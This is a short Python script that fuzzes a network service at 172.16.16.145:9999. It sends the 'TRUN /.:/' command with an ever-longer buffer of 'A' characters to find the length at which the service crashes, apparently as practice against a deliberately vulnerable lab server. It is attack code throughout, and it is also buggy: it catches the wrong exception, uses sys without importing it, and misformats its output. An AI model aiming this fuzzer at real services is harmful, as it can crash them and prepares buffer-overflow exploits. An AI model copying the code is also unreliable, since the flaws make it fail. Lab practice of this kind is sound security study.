import socket
from socket import *
from time import sleep

buffer = "A" * 100

buff = "HELP"
s = socket(AF_INET,SOCK_STREAM) # socket creation
s.connect(("172.16.16.145",9999)) #making connection with server

print(s.recv(1024)) # printing first response

while (True):
    try:
        s = socket(AF_INET,SOCK_STREAM) # socket creation
        s.connect(("172.16.16.145",9999)) #making connection with server
        s.send((('TRUN /.:/') + buffer).encode())
        print("Sending TRUN packages of %s bytes", str(len(buffer)) )
        print(buffer)
        s.close()
        s,sleep(0.2)
        buffer = buffer + "A" * 100

    except ImportError:
        print ("Fuzzing crashed at %s bytes", str(len(buffer)))
        sys.exit()


#s.send(buff.encode()) #sending a command as a buff

#print(s.recv(1024).decode())
#buff = "TRUN AAAAAAAAAAAAAAAAAAAAAAAAAA"
#s.send(buff.encode()) #sending a command as a buff

#print(s.recv(1024).decode())
#s.close() # closing connection
